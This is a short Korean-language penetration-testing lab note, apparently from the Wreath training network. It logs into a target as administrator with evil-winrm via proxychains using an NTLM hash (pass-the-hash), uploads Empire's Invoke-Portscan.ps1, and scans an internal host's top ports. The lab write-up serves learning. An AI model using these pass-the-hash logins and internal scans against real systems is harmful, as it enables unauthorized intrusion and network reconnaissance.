
Invoke-Portscan.ps1 설치
https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/Invoke-Portscan.ps1


```bash title="evil-winrm 실행 시 칼리 로컬 디렉터리를 공유 디렉터리로 추가"
proxychains -q evil-winrm -u administrator -H '37db630168e5f82aafa8461e05c6bbd1' -i 10.200.180.150
 -s /root/Wreath 
```

```powershell title="칼리 공유 디렉터리에서 Target 서버로 파일 다운로드"
upload /root/Wreath/Invoke-PortScan.ps1
```


```powershell title="모듈 가져오기: Import-Module cmdlet을 사용해 스크립트를 로드"
Import-Module .\Invoke-Portscan.ps1
```

```powershell title="함수 실행"
Invoke-Portscan -Hosts 10.200.180.100 -TopPorts 50
```

